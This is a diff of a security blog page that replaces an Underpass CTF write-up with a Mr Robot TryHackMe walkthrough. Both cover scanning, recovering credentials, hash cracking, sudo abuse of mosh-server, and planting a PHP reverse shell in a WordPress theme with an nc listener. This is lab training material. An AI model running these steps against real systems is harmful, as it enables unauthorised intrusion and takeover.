@@ -7,26 +7,26 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta name="description" content="Hello, today we gonna try to hack the Underpass machine  on hacktheboxthe first thing is enumerate and see if there is an open port on the targetmachine for that we gonna use the tool nmap  i tried to">
+<meta name="description" content="Table of Contents  Enumeration with Nmap directories FFUF foothhold Privilege Escalation  In this write-up, we will walk through the steps to hack the Mrrobot machineon Try Hack Me. Let’s dive in! Enu">
 <meta property="og:type" content="article">
-<meta property="og:title" content="UnderPass">
-<meta property="og:url" content="http://nutzh.top/Underpass/">
+<meta property="og:title" content="Mrrobot">
+<meta property="og:url" content="http://nutzh.top/Mrrobot/">
 <meta property="og:site_name" content="NUTZH">
-<meta property="og:description" content="Hello, today we gonna try to hack the Underpass machine  on hacktheboxthe first thing is enumerate and see if there is an open port on the targetmachine for that we gonna use the tool nmap  i tried to">
+<meta property="og:description" content="Table of Contents  Enumeration with Nmap directories FFUF foothhold Privilege Escalation  In this write-up, we will walk through the steps to hack the Mrrobot machineon Try Hack Me. Let’s dive in! Enu">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-12-25T13:36:03.052Z">
-<meta property="article:modified_time" content="2025-01-14T16:30:01.180Z">
+<meta property="article:published_time" content="2025-01-14T14:50:07.995Z">
+<meta property="article:modified_time" content="2025-01-14T16:26:27.521Z">
 <meta property="article:author" content="NUTZH">
-<meta property="article:tag" content="HACK THE BOX">
-<meta property="article:tag" content="WINDOWS">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PENETRATION TESTING">
+<meta property="article:tag" content="TRY HACK ME">
+<meta property="article:tag" content="LINUX">
 <meta name="twitter:card" content="summary">
 
-    <meta name="keywords" content="CTF , HACKTHEBOX , ACTIVE MACHINE">
+    <meta name="keywords" content="CTF , TRYHACKME , ACTIVE MACHINE">
 
 
-<title >UnderPass</title>
+<title >Mrrobot</title>
 
 <!-- Favicon -->
 
@@ -69,7 +69,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"nutzh.top","author":"NUTZH","root":"/","typed_text":["Cybersecurity Student"],"theme_version":"2.2.4","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"favico.png","icon16":"favico.png","icon32":"favico.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"favico.png","show_text":"(/≧▽≦/)","hide_text":"(●—●)"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-14 17:30:01"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-14 17:26:27"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.4" id="trm-switch-style">
@@ -235,7 +235,7 @@
     <div class="trm-banner">
     
     <!-- banner cover -->
-    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="https://pbs.twimg.com/media/GfLT662W8AADNOY.jpg">
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="https://wallpapercat.com/w/full/e/8/4/22100-3840x2160-desktop-4k-mr-robot-background-image.jpg">
     <!-- banner cover end -->
     
 
@@ -251,10 +251,10 @@
                     <!-- banner title -->
                     <div class="trm-banner-text ">
                         <div class="trm-label trm-mb-20">
-                            UNDERPASS
+                            Mr Robot
                         </div>
                         <h1 class="trm-mb-30 trm-hsmb-font">
-                            UnderPass
+                            Mrrobot
                         </h1>
 
                         
@@ -264,7 +264,7 @@
                                 </li>
                                 <li>
                                     <span>
-                                        Underpass
+                                        Mrrobot
                                     </span>
                                 </li>
                             </ul>
@@ -402,13 +402,13 @@
     <div class="col-sm-4">
         <div class="trm-card trm-label trm-label-light text-center">
             <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
-            12/25
+            01/14
         </div>
     </div>
     <div class="col-sm-4">
         <div class="trm-card trm-label trm-label-light text-center">
             <i class="iconfont far fa-clock trm-icon"></i><br>
-            14:36
+            15:50
         </div>
     </div>
     <div class="col-sm-4">
@@ -420,37 +420,58 @@
 </div>
 <div class="trm-card ">
     <article id="article-container" class="trm-publication">
-    <p>Hello, today we gonna try to hack the Underpass machine  on hackthebox<br>the first thing is enumerate and see if there is an open port on the target<br>machine for that we gonna use the tool nmap </p>
-<p>i tried to scan the machine in the first but i found just the port 80 and<br>22 so i tried with to scan UDP ports.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  -sU 10.10.11.48 -T5</span><br><span class="line">  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST</span><br><span class="line">  Warning: 10.10.11.48 giving up on port because retransmission <span class="built_in">cap</span> hit (2).</span><br><span class="line">  Nmap scan report <span class="keyword">for</span> underpass.htb (10.10.11.48)</span><br><span class="line">  Host is up (0.073s latency).</span><br><span class="line">  Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)</span><br><span class="line">  PORT    STATE SERVICE</span><br><span class="line">  161/udp open  snmp</span><br><span class="line"> </span><br><span class="line"> Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 100.11 seconds</span><br></pre></td></tr></table></figure>
-<p>we find  SNMP port open and SNMP stands for service network management<br>protocol , that port is used monitor and manage the network devices<br>connected over an IP we gonna use now snmp-check tool that helps us<br>to enumerate the SNMP devices </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ snmp-check 10.10.11.48</span><br><span class="line"> snmp-check v1.9 - SNMP enumerator</span><br><span class="line"> Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line"> [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community <span class="string">&#x27;public&#x27;</span></span><br><span class="line"></span><br><span class="line"> [*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 10.10.11.48</span><br><span class="line">  Hostname                      : UnDerPass.htb is the only daloradius server <span class="keyword">in</span> the basin!</span><br><span class="line">  Description                   : Linux underpass 5.15.0-126-generic <span class="comment">#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span></span><br><span class="line">  Contact                       : steve@underpass.htb</span><br><span class="line">  Location                      : Nevada, U.S.A. but not Vegas</span><br><span class="line">  Uptime snmp                   : 00:49:46.89</span><br><span class="line">  Uptime system                 : 00:49:36.98</span><br><span class="line">  System <span class="built_in">date</span>                   : 2024-12-25 19:21:21.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>interesting, we find a user:steve and the name of Host Underpass.htb<br>daloradius HMMM , lets look for it </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:24:00] Starting: daloradius/                                                                                                                  </span><br><span class="line">[14:24:05] 200 -  221B  - /daloradius/.gitignore                            </span><br><span class="line">[14:24:29] 301 -  323B  - /daloradius/app  -&gt;  http://underpass.htb/daloradius/app/</span><br><span class="line">[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             </span><br><span class="line">[14:24:41] 301 -  323B  - /daloradius/doc  -&gt;  http://underpass.htb/daloradius/doc/</span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    </span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/Dockerfile</span><br><span class="line">[14:24:55] 301 -  327B  - /daloradius/library  -&gt;  http://underpass.htb/daloradius/library/</span><br><span class="line">[14:24:55] 200 -   18KB - /daloradius/LICENSE                               </span><br><span class="line">[14:25:11] 200 -   10KB - /daloradius/README.md                             </span><br><span class="line">[14:25:15] 301 -  325B  - /daloradius/setup  -&gt;  http://underpass.htb/daloradius/setup/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
-<p>try to look for all these files and find something , lets brute force<br>the directories </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app </span><br><span class="line"> /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:33:44] Starting: daloradius/app/                                                                                                              </span><br><span class="line">[14:34:20] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:35:11] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:35:11] 302 -    0B  - /daloradius/app/users/  -&gt;  home-main.php         </span><br><span class="line">[14:35:11] 200 -    2KB - /daloradius/app/users/login.php </span><br></pre></td></tr></table></figure>
-<p>WOOW , we find a login page Great , but we need Username lets brute force<br>directories more like &#x2F;doc so i brute forced till i found </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      </span><br><span class="line">  [14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   </span><br><span class="line">                                                                             </span><br><span class="line">  Task Completed</span><br></pre></td></tr></table></figure>
-<p>after reading this file i we found the Username and the Password </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5. INSTALLATION COMPLETE</span><br><span class="line"> ------------------------</span><br><span class="line">            Surf to http://yourip/daloradius</span><br><span class="line">            Login:</span><br><span class="line">          username: administrator</span><br><span class="line">          password: radius</span><br></pre></td></tr></table></figure>
-<p>so i tried this administrator:radius and it failed so lets try to brute force<br>the &#x2F;app directory more and hope for something</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$  dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><span class="line">  /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/   pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line"> Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544</span><br><span class="line"></span><br><span class="line">  Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt</span><br><span class="line"></span><br><span class="line"> Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line"> [14:54:26] Starting: daloradius/app/</span><br><span class="line"> [14:54:27] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line"> [14:54:27] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line"> [14:55:10] 301 -  333B  - /daloradius/app/operators  -&gt;  http://underpass.htb/daloradius/app/operators/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>i went to &#x2F;app&#x2F;operators and i tried to access it with the last<br>Username:Password we had and its works we went to management and<br>list users and we find a hashed password so lets try to decode it<br>with crackstation or u can use john the ripper.<br>(type:MD5) 412DD4759978ACFCC81DEAB01B382403:underwaterfriends and lets try<br>to ssh with the username:password we got (btw : the username is svcMosh) </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh svcMosh@10.10.11.48</span><br><span class="line"><span class="comment"># and enter the password : underwaterfriends</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>IT WORKS, now we are inside the target machine<br>so u can read the user.flag </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">60a620dd37a894c9b.... <span class="comment"># U got this mate </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">   env_reset, mail_badpass,</span><br><span class="line">   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line"> User svcMosh may run the following commands on localhost:</span><br><span class="line">   (ALL) NOPASSWD: /usr/bin/mosh-server</span><br></pre></td></tr></table></figure>
-<p>after some searching on google or u can read its manual </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~<span class="variable">$mosh</span></span><br><span class="line">Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">      --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                              (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">      --server=COMMAND     mosh server on remote machine <span class="comment"># interesting </span></span><br><span class="line">                              (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>And we are the root , we can read the root file and get this done </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ mosh --server=<span class="string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost</span><br><span class="line"></span><br><span class="line">root@underpass:~# <span class="built_in">cat</span> /root/root.txt <span class="comment">#we are the root </span></span><br><span class="line"> 882f2654c3c9... <span class="comment">#try to find it </span></span><br></pre></td></tr></table></figure>
-
-<pre><code>                          CONGRATULATION 
+    <h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
+<li><a href="#enumeration-with-nmap"> Enumeration with Nmap</a></li>
+<li><a href="#directories-ffuf">directories FFUF</a></li>
+<li><a href="#foothhold">foothhold</a></li>
+<li><a href="#step-5-privilege-escalation">Privilege Escalation</a></li>
+</ol>
+<p>In this write-up, we will walk through the steps to hack the Mrrobot machine<br>on Try Hack Me. Let’s dive in!</p>
+<h2 id="Enumeration-with-Nmap"><a href="#Enumeration-with-Nmap" class="headerlink" title="Enumeration with Nmap"></a>Enumeration with Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> nmap -sV  10.10.136.4 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 15:54 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.136.4</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.10 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>Port 80 (HTTP)</strong> and <strong>Port 443 (HTTPS)</strong> are open, indicating a web server is<br>running.</p>
+</li>
+<li><p><strong>Port 22 (SSH)</strong> is closed, so we’ll focus on the web service for now.</p>
+</li>
+</ul>
+<h2 id="directories-FFUF"><a href="#directories-FFUF" class="headerlink" title="directories FFUF"></a>directories FFUF</h2><p>Next, we’ll search for hidden directories and files on the web server using<br><strong>FFUF</strong>, a fast web fuzzing tool.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u http://10.10.136.4/FUZZ -w SecLists/Discovery/Web-Content/common.txt -mc 200,301</span><br><span class="line"></span><br><span class="line">0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]</span><br><span class="line">Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 363ms]</span><br><span class="line">admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 318ms]</span><br><span class="line">audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 117ms]</span><br><span class="line">blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 70ms]</span><br><span class="line">css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 57ms]</span><br><span class="line">favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 65ms]</span><br><span class="line">images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 58ms]</span><br><span class="line">index.html              [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 84ms]</span><br><span class="line">js                      [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 56ms]</span><br><span class="line">license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 71ms]</span><br><span class="line">intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 62ms]</span><br><span class="line">readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 65ms]</span><br><span class="line">robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 58ms]</span><br><span class="line">robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 59ms]</span><br><span class="line">sitemap.xml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]</span><br><span class="line">sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 66ms]</span><br><span class="line">video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 56ms]</span><br><span class="line">wp-admin                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 64ms]</span><br><span class="line">wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 68ms]</span><br><span class="line">wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 71ms]</span><br></pre></td></tr></table></figure>
+<p><strong>robots.txt</strong> and <strong>license</strong> are particularly interesting. Let’s investigate them.<br>Visiting <em><a target="_blank" rel="noopener" href="http://10.10.136.4/robots.txt">http://10.10.136.4/robots.txt</a></em> reveals the first flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.136.4/key-1-of-3.txt                     </span><br><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+<p>The license file contains a Base64-encoded string:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.136.4/license       </span><br><span class="line"></span><br><span class="line">what you <span class="keyword">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> you want a password or something?</span><br><span class="line"></span><br><span class="line">ZWxsaW90OkVSMjgtMDY1Mgo=</span><br></pre></td></tr></table></figure>
+<p>Decoding it reveals credentials: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;ZWxsaW90OkVSMjgtMDY1Mgo=&#x27;</span> |<span class="built_in">base64</span> -d</span><br><span class="line">elliot:ER28-0652</span><br></pre></td></tr></table></figure>
+<h2 id="foothhold"><a href="#foothhold" class="headerlink" title="foothhold"></a>foothhold</h2><p>With the credentials, we log in to the WordPress admin panel at <a target="_blank" rel="noopener" href="http://10.10.136.4/wp-admin">http://10.10.136.4/wp-admin</a></p>
+<h3 id="Exploiting-WordPress"><a href="#Exploiting-WordPress" class="headerlink" title="Exploiting WordPress:"></a>Exploiting WordPress:</h3><ol>
+<li><p>avigate to Appearance &gt; Theme Editor.</p>
+</li>
+<li><p>Edit the 404.php template and insert a PHP reverse shell (you can generate<br>one using tools like PentestMonkey’s PHP Reverse Shell).</p>
+</li>
+<li><p>Save the file and trigger the 404 page by visiting a non-existent URL, (e.g: <a target="_blank" rel="noopener" href="http://10.10.136.4/wp-admin/tvbmvbmvb">http://10.10.136.4/wp-admin/tvbmvbmvb</a>.)</p>
+</li>
+</ol>
+<p>Set up a listener on your machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 9000</span><br></pre></td></tr></table></figure>
+<p>so after u will get the reverse shell </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -vlnp 9000        </span><br><span class="line">listening on [any] 9000 ...</span><br><span class="line">connect to [10.9.1.253] from (UNKNOWN) [10.10.227.61] 59801</span><br><span class="line">Linux linux 3.13.0-55-generic <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 15:12:42 up 7 min,  0 <span class="built_in">users</span>,  load average: 0.16, 0.07, 0.06</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1(daemon) gid=1(daemon) <span class="built_in">groups</span>=1(daemon)</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2005): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">daemon@linux:/$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">daemon</span><br></pre></td></tr></table></figure>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Now, we’ll escalate our privileges to root.</p>
+<h3 id="Checking-for-SUID-Binaries"><a href="#Checking-for-SUID-Binaries" class="headerlink" title="Checking for SUID Binaries:"></a>Checking for SUID Binaries:</h3><p>SUID binaries allow users to execute files with the permissions of the file<br>owner. We search for SUID binaries using:</p>
